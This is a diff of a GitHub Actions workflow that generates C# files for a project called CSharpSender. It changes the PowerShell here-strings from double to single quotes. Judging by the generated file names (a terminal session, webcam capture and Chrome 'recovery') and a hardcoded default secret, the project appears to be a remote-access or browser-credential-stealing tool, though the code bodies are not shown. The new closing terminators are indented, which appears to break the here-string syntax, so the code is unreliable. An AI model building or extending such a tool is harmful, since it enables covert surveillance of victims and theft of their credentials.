@@ -21,7 +21,7 @@ jobs:
         $root = "csharpsender/CSharpSender"
 
         if (-not (Test-Path "$root/BuildConfig.cs")) {
-          @"
+          @'
 namespace CSharpSender;
 internal static class BuildConfig
 {
@@ -30,11 +30,11 @@ internal static class BuildConfig
     public const string DefaultSecret = "changeme";
     public const string ExeName       = "CSharpSender";
 }
-"@ | Out-File -FilePath "$root/BuildConfig.cs" -Encoding UTF8
+ '@ | Out-File -FilePath "$root/BuildConfig.cs" -Encoding UTF8
         }
 
         if (-not (Test-Path "$root/TerminalSession.cs")) {
-          @"
+          @'
 using System;
 using System.Threading.Tasks;
 
@@ -80,7 +80,7 @@ namespace CSharpSender
         }
 
         if (-not (Test-Path "$root/WebcamCapture.cs")) {
-          @"
+          @'
 using System;
 using System.Drawing;
 using System.Drawing.Drawing2D;
@@ -131,11 +131,11 @@ namespace CSharpSender
         }
     }
 }
-"@ | Out-File -FilePath "$root/WebcamCapture.cs" -Encoding UTF8
+ '@ | Out-File -FilePath "$root/WebcamCapture.cs" -Encoding UTF8
         }
 
         if (-not (Test-Path "$root/ChromeRecovery.cs")) {
-          @"
+          @'
 using System.Text.Json;
 using System.Threading.Tasks;
 
@@ -159,7 +159,7 @@ namespace CSharpSender
         }
     }
 }
-"@ | Out-File -FilePath "$root/ChromeRecovery.cs" -Encoding UTF8
+ '@ | Out-File -FilePath "$root/ChromeRecovery.cs" -Encoding UTF8
         }
 
     - name: Read config from BuildConfig
